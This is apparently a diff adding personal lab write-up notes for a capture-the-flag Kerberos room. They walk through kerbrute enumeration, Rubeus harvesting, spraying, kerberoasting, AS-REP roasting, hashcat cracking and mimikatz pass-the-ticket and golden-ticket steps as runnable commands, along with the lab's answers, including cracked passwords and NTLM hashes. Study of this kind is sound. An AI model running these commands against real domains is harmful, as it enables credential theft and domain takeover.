@@ -1,0 +1,141 @@
+
+#Enumeration w/ Kerbrute
+
+1. install kerbrute on your machine
+
+2. Make it executable chmod +x 
+
+3. Downloads list of usernames
+
+4. Add DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine
+
+5. Run "./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt" - This will brute force user accounts from a domain controller using a supplied wordlist
+
+#Harvesting & Brute-forcing Tickets w/ Rubeus
+	
+	#Harvesting Tickets w/ Rubeus - 
+
+1. Uploads Rubeus to the target machine
+
+2. Navigate to the directory Rubeus is in
+
+3. Run "Rubeus.exe harvest /interval:30" - This command tells Rubeus to harvest for TGTs every 30 seconds
+
+	#Brute-Forcing / Password-Spraying w/ Rubeus -
+
+4. Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 
+
+"echo <TARGET_IP>  CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts"
+
+5. Navigate to the directory Rubeus is in
+
+6. Run "Rubeus.exe brute /password:Password1 /noticket" - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
+
+7. Which domain admin do we get a ticket for when harvesting tickets? - Administrator
+
+8. Which domain controller do we get a ticket for when harvesting tickets? - CONTROLLER-1$
+
+#Kerberoasting w/ Rubeus & Impacket
+	
+	#Method 1 - Rubeus
+
+1. Upload Rubeus to target machine
+
+2. Navigate to the directory Rubeus is in
+
+3. Run "Rubeus.exe kerberoast" - This will dump the Kerberos hash of any kerberoastable users    
+
+4. copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
+
+5. Run "hashcat -m 13100 -a 0 hash.txt Pass.txt" - now crack that hash (Pass.txt is a list of password or use rockyou.txt)
+	
+	#Method 2 - Impacket
+
+1. Install Impacket on your machine
+
+	#Kerberoasting w/ Impacket - 
+
+2. cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located
+
+3. Run "sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.143.201 -request" - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
+
+4. hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
+	
+SQLService:MYPASSWORD123
+
+#AS-REP Roasting w/ Rubeus
+
+	#Dumping KRBASREP5 Hashes w/ Rubeus -
+
+1. Uploads Rubeus to target machine, Navigate the the directort Rubeus is in.
+
+2. Run "Rubeus.exe asreproast" - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
+
+	#Crack those Hashes w/ hashcat - 
+
+1. Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
+
+2. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
+
+Use the same wordlist that you downloaded in task 4
+
+3. hashcat -m 18200 hash.txt Pass.txt - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 
+
+user3:Password3
+admin3:P@$$W0rd2
+
+#Pass the Ticket w/ mimikatz
+
+Prepare Mimikatz & Dump Tickets - 
+
+You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.
+
+1. Uploads mimikatz.exe to the target machine and Navigate to the directory mimikatz is in
+
+2. Run "mimikatz.exe" - run mimikatz
+
+3. Run "privilege::debug"- Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+
+4. Run "sekurlsa::tickets /export" - this will export all of the .kirbi tickets into the directory that you are currently in
+
+	#Pass the Ticket w/ Mimikatz
+
+Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
+
+1. Run "kerberos::ptt <ticket>" - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
+
+ticket : [0;37d18]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+
+2. Exit mimikatz and Run "klist" - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+
+3. You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share : "dir \\<TARGET_IP>\admin$
+
+#Golden/Silver Ticket Attacks w/ mimikatz
+	
+	#Dump the krbtgt hash -
+
+﻿1. Upload mimikatz to the target machine and navigate to the directory mimikatz is in and run mimikatz
+
+2. Run "privilege::debug" - ensure this outputs [privilege '20' ok]
+
+﻿3. Run "lsadump::lsa /inject /name:krbtgt" - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+
+	#Create a Golden/Silver Ticket - 
+
+﻿4. Run "Kerberos::golden /user:Administrator /domain:controller.local /sid:# /krbtgt:$ /id:$" - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+
+To crete a Silver ticket, replace the golden to silver
+
+Mine: Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502
+
+	#Use the Golden/Silver Ticket to access other machines -
+
+﻿5.  Run "misc::cmd" - this will open a new elevated command prompt with the given ticket in mimikatz.
+
+
+What is the SQLService NTLM Hash? (Run lsadump::lsa /inject /name:SQLService) 
+cd40c9ed96265531b21fc5b1dafcfb0a
+
+
+What is the Administrator NTLM Hash? (Run lsadump::lsa /inject /name:Administrator)
+
